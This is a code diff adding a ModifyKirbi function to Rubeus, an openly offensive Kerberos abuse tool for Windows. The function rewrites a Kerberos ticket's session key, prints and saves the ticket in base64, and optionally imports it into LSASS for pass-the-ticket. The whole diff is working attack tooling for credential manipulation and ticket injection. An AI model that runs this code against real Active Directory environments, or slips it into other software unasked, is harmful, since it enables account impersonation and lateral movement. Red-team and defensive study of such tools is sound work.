@@ -1492,5 +1492,56 @@ namespace Rubeus
 
             return kirbiBytes;
         }
+
+        public static void ModifyKirbi(KRB_CRED kirbi, byte[] sessionKey = null, Interop.KERB_ETYPE sessionKeyEtype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1, bool ptt = false, LUID luid = new LUID(), string outfile = "")
+        {
+            if (sessionKey != null)
+            {
+                kirbi.enc_part.ticket_info[0].key = new EncryptionKey();
+                kirbi.enc_part.ticket_info[0].key.keyvalue = sessionKey;
+                kirbi.enc_part.ticket_info[0].key.keytype = (int)sessionKeyEtype;
+            }
+
+            byte[] kirbiBytes = kirbi.Encode().Encode();
+
+            string kirbiString = Convert.ToBase64String(kirbiBytes);
+
+            Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
+
+            if (Program.wrapTickets)
+            {
+                // display the .kirbi base64, columns of 80 chararacters
+                foreach (string line in Helpers.Split(kirbiString, 80))
+                {
+                    Console.WriteLine("      {0}", line);
+                }
+            }
+            else
+            {
+                Console.WriteLine("      {0}", kirbiString);
+            }
+
+            Console.WriteLine("");
+
+            if (!String.IsNullOrEmpty(outfile))
+            {
+                KrbCredInfo info = kirbi.enc_part.ticket_info[0];
+                DateTime fileTime = (DateTime)info.starttime;
+                string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
+                filename = Helpers.MakeValidFileName(filename);
+                if (Helpers.WriteBytesToFile(filename, kirbiBytes))
+                {
+                    Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
+                }
+            }
+
+            Console.WriteLine("");
+
+            if (ptt || ((ulong)luid != 0))
+            {
+                // pass-the-ticket -> import into LSASS
+                LSA.ImportTicket(kirbiBytes, luid);
+            }
+        }
     }
 }
